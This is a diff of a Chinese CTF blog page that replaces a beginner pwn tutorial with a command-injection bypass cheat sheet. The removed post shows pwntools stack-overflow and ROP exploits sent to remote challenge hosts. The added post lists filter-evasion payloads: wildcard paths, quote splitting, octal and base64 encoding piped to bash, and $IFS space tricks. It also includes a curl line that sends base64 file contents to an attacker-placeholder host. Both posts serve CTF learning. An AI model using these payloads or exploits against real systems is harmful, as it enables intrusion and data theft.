@@ -20,28 +20,20 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":250,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="二进制安全新手">
+  <meta name="description" content="命令执行技巧">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn入门">
-<meta property="og:url" content="http://example.com/2024/04/05/pwn%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="http://example.com/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="blog">
-<meta property="og:description" content="二进制安全新手">
+<meta property="og:description" content="命令执行技巧">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wiki.wgpsec.org/images/ret2text/1.jpg">
-<meta property="og:image" content="https://wiki.wgpsec.org/images/ret2text/2.jpg">
-<meta property="og:image" content="https://wiki.wgpsec.org/images/ret2text/3.jpg">
-<meta property="og:image" content="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png">
-<meta property="og:image" content="https://s2.loli.net/2024/04/23/mILyK4DRT3tABPV.png">
-<meta property="og:image" content="https://s2.loli.net/2024/04/23/RlaXbiVpeLErJfn.png">
-<meta property="og:image" content="https://s2.loli.net/2024/04/23/NFL8Sm5P4vdZsM9.png">
-<meta property="article:published_time" content="2024-04-05T15:51:15.000Z">
-<meta property="article:modified_time" content="2024-04-26T15:44:06.900Z">
+<meta property="article:published_time" content="2024-04-27T13:36:10.000Z">
+<meta property="article:modified_time" content="2024-04-28T01:12:32.845Z">
 <meta property="article:author" content="小zhou">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wiki.wgpsec.org/images/ret2text/1.jpg">
 
-<link rel="canonical" href="http://example.com/2024/04/05/pwn%E5%85%A5%E9%97%A8/">
+<link rel="canonical" href="http://example.com/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
 <script id="page-configurations">
@@ -54,7 +46,7 @@
   };
 </script>
 
-  <title>pwn入门 | blog</title>
+  <title>命令执行 | blog</title>
   
 
 
@@ -202,7 +194,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/05/pwn%E5%85%A5%E9%97%A8/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
@@ -215,7 +207,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn入门
+          命令执行
         </h1>
 
         <div class="post-meta">
@@ -225,14 +217,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2024-04-05 23:51:15" itemprop="dateCreated datePublished" datetime="2024-04-05T23:51:15+08:00">2024-04-05</time>
+              <time title="创建时间：2024-04-27 21:36:10" itemprop="dateCreated datePublished" datetime="2024-04-27T21:36:10+08:00">2024-04-27</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-04-26 23:44:06" itemprop="dateModified" datetime="2024-04-26T23:44:06+08:00">2024-04-26</time>
+                <time title="修改时间：2024-04-28 09:12:32" itemprop="dateModified" datetime="2024-04-28T09:12:32+08:00">2024-04-28</time>
               </span>
 
           <br>
@@ -241,14 +233,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
+              <span>897</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -260,75 +252,98 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>二进制安全新手</p>
+        <p> 命令执行技巧</p>
 <span id="more"></span>
 
-<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
-<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>CALL 指令：</p>
-<p>CALL 指令用于调用一个子程序（或称为过程或函数）。它实现了一种跳转到其他代码块执行的机制，但与 JMP 不同，CALL 在执行跳转之前会将当前指令的下一条指令地址入栈，以便在子程序执行完毕后能够返回到调用点。这为程序的模块化和结构化提供了基础，使得代码更易于理解和维护。</p>
-<p>RET 指令：</p>
-<p>RET 指令与 CALL 相对应，用于从子程序中返回到调用点。它从栈中弹出之前保存的返回地址，将程序的控制流恢复到调用点，实现了子程序的返回操作。RET 的使用使得程序能够方便地从一个子程序切换回到主程序，完成所需的计算和任务。</p>
-<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
-<p><strong>栈从高地址向低地址生长，ebp高地址，esp低地址，</strong></p>
-<p>rbp 64 位寄存器 ebp 32 位寄存器</p>
-<p>由此可见 main函数的返回地址在 rbp+8的地址上</p>
-<p>bss段<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。</p>
-<p>bss是英文Block Started by Symbol的简称。</p>
-<p>bss段属于静态内存分配。<br>比如</p>
-<p>int a;</p>
-<p>data段<br>数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。</p>
-<p>数据段属于静态内存分配。<br>比如</p>
-<p>int a&#x3D; 1<br>text段<br>代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
-<p>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。</p>
-<p>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
-<p>heap<br>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</p>
-<p>当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；</p>
-<p>当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
-<p>stack<br>栈又称堆栈，是用户存放程序临时创建的局部变量，</p>
-<p>也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。</p>
-<p>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
-<p>由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。</p>
-<p>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
-<p>一般般来说，我们会有如下的覆盖需求</p>
-<ul>
-<li><p><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</p>
-</li>
-<li><p><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</p>
-</li>
-<li><p><strong>覆盖 bss 段某个变量的内容</strong>。</p>
-</li>
-<li><p>根据现实执行情况，覆盖特定的变量或地址的内容。</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。</p>
-<p><img src="https://wiki.wgpsec.org/images/ret2text/1.jpg" alt="1.jpg"></p>
-<p>然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。</p>
-<p><img src="https://wiki.wgpsec.org/images/ret2text/2.jpg" alt="2.jpg"></p>
-<p><img src="https://wiki.wgpsec.org/images/ret2text/3.jpg" alt="3.jpg"></p>
-<p>ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。</p>
-<p>手动打断点调试如下</p>
-<p><img src="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27644</span>)</span><br><span class="line">sys_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="nx-保护"><a href="#nx-保护" class="headerlink" title="nx 保护"></a>nx 保护</h2><p>hahaha</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./hahaha</span><br></pre></td></tr></table></figure>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">more/bzmore</span><br><span class="line">cat </span><br><span class="line">less/bzless</span><br><span class="line">head  head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。用法为：</span><br><span class="line">tail 作用和head相似，但它默认显示最后 10 行</span><br><span class="line">nl</span><br><span class="line">sed</span><br><span class="line">sort</span><br><span class="line">uniq</span><br><span class="line">rev</span><br><span class="line">od</span><br><span class="line">vim/vi</span><br><span class="line">man man 命令是 Linux 下的帮助指令，通过 man 指令可以查看 Linux 中的指令帮助、配置文件帮助和编程帮助等信息，类似于vim/vi，直接对文本运行可以看到文本内容。</span><br><span class="line">paste 使用paste命令可以将每个指定文件里的每一行整合到对应一行里写到标准输出,之间用制表符分隔</span><br><span class="line">grep 查找文件里符合条件的字符串</span><br><span class="line">file 查看文件信息或类型</span><br><span class="line">dd 用于读取、转换并输出数据</span><br><span class="line">diff 用于比较文件的内容，我们可以把想读取的文件内容和一个已知的文件进行比较，获得差集也就是我们想要的内容了</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2024/04/23/mILyK4DRT3tABPV.png"></p>
-<p>程序为64位elf文件，开启NX保护。</p>
-<p>仅仅64 位的文件需要，32位直接打</p>
-<p>payload形式为：nop + p(rdi | ret) + p(system_addr) + p(bin_sh)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary hahaha</span><br></pre></td></tr></table></figure>
+<h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><table>
+<thead>
+<tr>
+<th>[list]</th>
+<th>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[^list]</td>
+<td>匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td>[!list]</td>
+<td>同[^list]</td>
+</tr>
+<tr>
+<td>{str1,str2}</td>
+<td>匹配str1或者str2字符，也可以是集合</td>
+</tr>
+<tr>
+<td>IFS</td>
+<td>由<space>或<tab>或</tab></space></td>
+</tr>
+<tr>
+<td>CR</td>
+<td>由<enter>产生</enter></td>
+</tr>
+<tr>
+<td>!</td>
+<td>执行history中的命令</td>
+</tr>
+</tbody></table>
+<p>通配符绕过字母过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2024/04/23/RlaXbiVpeLErJfn.png"></p>
-<p>system_addr</p>
-<p><img src="https://s2.loli.net/2024/04/23/NFL8Sm5P4vdZsM9.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;120.46.59.242&#x27;</span>,<span class="number">2103</span>)</span><br><span class="line">system_addr = <span class="number">0x400460</span></span><br><span class="line">pop_rdi = <span class="number">0x0400643</span></span><br><span class="line">bin_sh = <span class="number">0x0400664</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x30</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> * padding+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????????</span><br><span class="line">?c=/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
 
 
 
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39194641/article/details/101113761">https://blog.csdn.net/weixin_39194641/article/details/101113761</a>)</p>
-<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39194641/article/details/101113761">CTF中的PWN——绕NX防护1（本地libc 栈溢出）_ctf的pwn中nx为什么-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上） - 知乎 (zhihu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a>)</p>
+
+
+<h2 id="分割文件名"><a href="#分割文件名" class="headerlink" title="分割文件名"></a>分割文件名</h2><p>linux里，ca’’t、ca\t、ca””t和cat是等效的，所以我们可以用这种方式绕过关键词过滤</p>
+<p>ca$*t flag </p>
+<p>ca${5}t flag</p>
+<p>cat$@t flag</p>
+<p>ca$5t flag</p>
+<h2 id="转进制"><a href="#转进制" class="headerlink" title="转进制"></a>转进制</h2><p>我们可以把flag转成八进制，变成$’\146\154\141\147’，然后用cat &#x2F;$’\146\154\141\147’即可</p>
+<p>或者16 进制</p>
+<h2 id="利用管道符"><a href="#利用管道符" class="headerlink" title="利用管道符"></a>利用管道符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IC9mKg==&quot; | base64 -d|bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="x2F-被过滤怎么绕过"><a href="#x2F-被过滤怎么绕过" class="headerlink" title="&#x2F;被过滤怎么绕过"></a>&#x2F;被过滤怎么绕过</h2><pre><code>$&#123;string:start:length&#125; 从字符串左边开始计数
+
+string为要截取的字符串，start是起始位置（从左边开始，从0开始计数），length是要截取的长度(省略的话表示直到字符串的末尾)
+
+$&#123;string:0-start:length&#125; 从右边开始计数
+</code></pre>
+<p>linux里echo ${PATH}可以获得当前路径：</p>
+<p>${PATH:0:1}</p>
+<p>比如${PWD:0:1}、${HOME:0:1}、${SHELL:0:1}等等</p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,/flag&#125;</span><br><span class="line">sort&lt;flag.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>cp mv 对目标文件进行改名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl your_ip:port/?q=`cat flag| grep flag |base64`</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>过滤分割符 | &amp; ；</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;  //分号</span><br><span class="line">|  //只执行后面那条命令</span><br><span class="line">||  //只执行前面那条命令</span><br><span class="line">&amp;  //两条命令都会执行</span><br><span class="line">&amp;&amp;  //两条命令都会执行</span><br><span class="line">%0a      //换行符</span><br><span class="line">%0d     //回车符号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>命令执行字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p>在linux系统中，反引号是作为内联执行，输出查询结果的内容。比如用ls查询出index.php。那么<code>ls</code>就代表了index.php这个文件。那么我们就可以使用cat命令查看index.php的内容，而这一道题就可以使用cat$IFS$1<code>ls</code> 这个命令来输出flag了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,要执行命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">cat `echo 666c61672e706870 | xxd -r -p` 或 cat $(echo 666c61672e706870 | xxd -r -p) 或 echo 666c61672e706870 | xxd -r -p | xargs cat</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IC9mKg==&quot; | base64 -d|bash</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -358,7 +373,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/linux/" rel="tag"># linux</a>
           </div>
 
         
@@ -367,12 +382,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="php代码审计">
-      <i class="fa fa-chevron-left"></i> php代码审计
+    <a href="/2024/04/26/fastjson1-2-4/" rel="prev" title="fastjson1.2.4">
+      <i class="fa fa-chevron-left"></i> fastjson1.2.4
     </a></div>
       <div class="post-nav-item">
-    <a href="/2024/04/08/ognl/" rel="next" title="ognl">
-      ognl <i class="fa fa-chevron-right"></i>
+    <a href="/2024/05/10/2024xyctf/" rel="next" title="2024xyctf">
+      2024xyctf <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -432,7 +447,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.</span> <span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nx-%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.3.</span> <span class="nav-text">nx 保护</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">文件读取函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">通配符绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E5%89%B2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">1.3.</span> <span class="nav-text">分割文件名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AC%E8%BF%9B%E5%88%B6"><span class="nav-number">1.4.</span> <span class="nav-text">转进制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="nav-number">1.5.</span> <span class="nav-text">利用管道符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x2F-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="nav-number">1.6.</span> <span class="nav-text">&#x2F;被过滤怎么绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">空格绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">2.1.</span> <span class="nav-text">无回显</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%AA%E6%96%AD"><span class="nav-number">2.2.</span> <span class="nav-text">截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">2.3.</span> <span class="nav-text">长度限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C"><span class="nav-number">2.4.</span> <span class="nav-text">内敛执行</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
